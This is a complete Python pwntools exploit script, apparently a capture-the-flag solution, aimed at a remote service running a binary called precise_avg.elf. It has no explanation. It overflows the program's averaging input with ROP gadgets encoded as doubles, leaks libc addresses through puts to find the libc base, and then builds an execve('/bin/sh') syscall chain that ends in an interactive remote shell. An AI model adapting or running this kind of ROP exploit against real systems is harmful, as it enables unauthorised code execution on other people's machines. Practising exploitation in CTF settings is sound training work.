from pwn import *
import struct

elf = ELF("./precise_avg.elf")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
sock = remote("82.196.10.106", 12499)
#libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#sock = remote("127.0.0.1", 9100)
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = process("./precise_avg.elf")
_ = raw_input()

def write_qword(data):
    double = repr(struct.unpack("<d", p64(data))[0])
    sock.sendline(double)

addr_start = 0x00400670
rop_pop_rdi = 0x004009c3

# Stage 1
sock.recvuntil(": ")
sock.sendline(str(35 + 7))
for i in range(35):
    sock.sendline("+")
write_qword(rop_pop_rdi)
write_qword(elf.got["puts"])
write_qword(elf.plt["puts"])
write_qword(rop_pop_rdi)
write_qword(elf.got["alarm"])
write_qword(elf.plt["puts"])
write_qword(addr_start)
sock.recvline()

ret = sock.recvline().rstrip()
addr_puts = u64(ret + "\x00\x00")
ret = sock.recvline().rstrip()
addr_alarm = u64(ret + "\x00\x00")
log.success("<puts> = " + hex(addr_puts))
log.success("<alarm> = " + hex(addr_alarm))
libc_base = addr_puts - libc.symbols["puts"]
addr_binsh = libc_base + next(libc.search("/bin/sh"))
log.success("libc base = " + hex(libc_base))

rop_pop_rax = libc_base + 0x000439c7
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_syscall = libc_base + 0x000013c0

# Stage 2
sock.recvuntil(": ")
sock.sendline(str(35 + 9))
for i in range(35):
    sock.sendline("+")
write_qword(rop_pop_rdi)
write_qword(addr_binsh)
write_qword(rop_pop_rdx)
write_qword(0)
write_qword(rop_pop_rsi)
write_qword(0)
write_qword(rop_pop_rax)
write_qword(59)
write_qword(rop_syscall)
sock.recvline()

# Now we have the shell
sock.interactive()
